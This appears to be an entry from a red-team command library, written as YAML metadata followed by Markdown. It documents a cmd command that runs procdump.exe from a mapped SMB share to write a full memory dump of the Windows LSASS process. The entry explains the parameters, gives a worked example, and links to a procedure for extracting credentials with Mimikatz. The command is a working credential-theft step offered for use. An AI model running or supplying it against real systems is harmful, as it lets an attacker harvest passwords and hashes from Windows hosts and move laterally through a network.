---
id: f221e361-14df-4479-920d-be7637645650
name: create-lsass-dump-smb
type: command
executor: cmd
data: 'Z:\procdump.exe -accepteula -ma $_LSASS_PID lsass.dmp'
output: null
created_at: '2023-04-06T03:56:27.177153+00:00'
updated_at: '2023-04-10T20:37:14.787792+00:00'
platforms:
  - Windows
tags:
  - dump
  - lsass
  - smb
verified: true
validated: true
---

# create-lsass-dump-smb

## Command

```cmd
Z:\procdump.exe -accepteula -ma $_LSASS_PID lsass.dmp
```

## Description

Executes procdump.exe from the mapped SMB share to dump LSASS memory by PID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -accepteula | Automatically accepts the EULA | Yes |
| -ma | Creates a full mini dump | Yes |
| $_LSASS_PID | LSASS process ID (e.g., 1234) | Yes |
| lsass.dmp | Output file name | Yes |

## Examples

### Basic Usage

```cmd
Z:\procdump.exe -accepteula -ma 1234 lsass.dmp
```

## Expected Output

```
Procdump v10.1 - Sysinternals - www.sysinternals.com

[Similar to HTTP dump output, confirming creation]
```

## Related

- [[procedures/windows-lsass-mini-dump-for-mimikatz]]
